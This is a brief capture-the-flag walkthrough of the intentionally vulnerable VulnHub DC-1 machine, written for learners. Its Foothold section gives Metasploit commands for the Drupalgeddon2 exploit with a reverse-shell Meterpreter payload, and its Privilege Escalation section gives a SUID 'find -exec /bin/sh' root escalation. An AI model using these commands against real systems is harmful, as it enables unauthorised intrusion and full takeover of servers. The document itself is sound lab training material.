# DC-1 CTF – Summary Walkthrough

A full text-based breakdown of the DC-1 vulnerable machine from VulnHub. This beginner-friendly box simulates a real-world web server running Drupal CMS and focuses on web enumeration, exploitation, and privilege escalation.

## Discovery
- Ran `nmap -A -Pn <ip>` → Found ports: 22 (SSH), 80 (HTTP – Drupal 7), 111 (RPC service)

## Enumeration
- Navigated to `http://<ip>` in browser → Displayed default **Drupal 7** page
- Identified the CMS and suspected a vulnerable version
- Launched Metasploit and searched for Drupal-related exploits

## ⚙️ Foothold
- Used Metasploit to exploit **Drupalgeddon2 (CVE-2018–7600)**:
  ```
  msfconsole
  use exploit/unix/webapp/drupal_drupalgeddon2
  set RHOSTS <target-ip>
  set RPORT 80
  set TARGET 0
  set payload php/meterpreter/reverse_tcp
  set LHOST <your-ip>
  run
  ```
✅ Successfully received a Meterpreter session

## Shell Access
- Dropped to interactive shell using:
  ```
  shell
  ```
- Searched for SUID binaries:
  ```
  find / -perm -4000 -type f 2>/dev/null
  ```

## Privilege Escalation
- Moved to `/tmp` and created a file:
  ```
  cd /tmp
  touch DC-1
  ```
- Escalated privileges using:
  ```
  find DC-1 -exec "/bin/sh" \;
  ```
✅ Gained root access

---

**Full walkthrough with screenshots:**  
👉 [View the Medium post here](https://medium.com/@basitolasubomibalogun/dc-1-vulnhub-ctf-walkthrough-remote-code-execution-privilege-escalation-via-drupal-3e49de54f7a4)
